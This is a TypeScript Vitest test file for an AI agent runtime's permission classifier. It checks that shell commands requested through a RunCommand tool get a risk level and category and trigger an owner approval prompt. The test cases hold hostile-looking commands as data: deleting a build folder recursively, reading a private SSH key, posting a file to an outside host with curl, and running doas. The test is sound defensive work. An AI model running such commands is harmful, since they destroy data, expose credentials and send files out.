import { describe, expect, it, vi } from 'vitest';

import { formatPermissionPromptText } from '@core/channels/permission-interaction.js';
import { resolveWorkspaceFolderPath } from '@core/platform/workspace-folder.js';
import { resolvePermissionIpcDecision } from '@core/runtime/ipc-permission-classifier-decision.js';

describe('IPC permission classifier decision', () => {
  it.each([
    ['destructive', 'rm -rf ./build', 'high', 'destructive'],
    ['credential', 'cat ~/.ssh/id_rsa', 'high', 'secret'],
    ['egress', 'curl -d @payload.txt https://example.com', 'medium', 'network'],
    ['privileged', 'doas whoami', 'high', 'privileged'],
  ] as const)(
    'renders deterministic %s rail risk without a classifier verdict',
    async (_label, command, level, category) => {
      const requestPermissionApproval = vi.fn(async () => ({
        approved: false,
        mode: 'cancel' as const,
        decidedBy: 'owner',
      }));

      const decision = await resolvePermissionIpcDecision({
        request: {
          requestId: `rail-risk-${category}`,
          sourceAgentFolder: 'main_agent',
          toolName: 'RunCommand',
          toolInput: { command },
        },
        sourceAgentFolder: 'main_agent',
        deps: {
          conversationRoutes: () => ({}),
          requestPermissionApproval,
          getPermissionRuntimeSettings: () => ({
            agents: { main_agent: { permissionMode: 'ask' as const } },
            permissions: {
              autoMode: {},
              trustedRoots: [resolveWorkspaceFolderPath('main_agent')],
            },
            memory: { llm: { models: { extractor: 'sonnet' } } },
          }),
        } as never,
      });

      expect(requestPermissionApproval).toHaveBeenCalledOnce();
      const promptRequest = requestPermissionApproval.mock.calls[0]![0];
      expect(promptRequest).toMatchObject({
        risk_level: level,
        risk_category: category,
      });
      expect(formatPermissionPromptText(promptRequest, 60_000)).toContain(
        `Risk: ${level} — ${category}`,
      );
      expect(decision).toMatchObject({
        risk_level: level,
        risk_category: category,
      });
    },
  );
});
